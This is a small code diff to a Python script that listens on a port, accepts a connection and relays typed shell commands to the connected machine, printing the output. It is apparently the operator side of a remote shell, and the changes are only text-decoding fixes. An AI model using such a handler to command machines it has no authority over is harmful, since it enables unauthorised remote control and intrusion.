@@ -12,14 +12,14 @@ print("Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connection
 s.listen(10) # Listen for only 10 connection
 conn, addr = s.accept() # Accept connections
 print("Connected by", addr) # Print connected by ipaddress
-data = conn.recv(1024) # Receive initial connection
+data = conn.recv(1024).decode("UTF-8") # Receive initial connection
 
 while 1: # Start loop
     command = input("Enter shell command or quit: ") # Enter shell command
-    conn.send(bytes(command, 'UTF-8')) # Send shell command
+    conn.send(bytes(command, "UTF-8")) # Send shell command
     if command == "quit":
         break # If we specify quit then break out of loop and close socket
-    data = conn.recv(1024) # Receive output from linux command
+    data = conn.recv(1024).decode("UTF-8") # Receive output from linux command
     print(data) # Print the output of the linux command
 
 conn.close() # Close socket
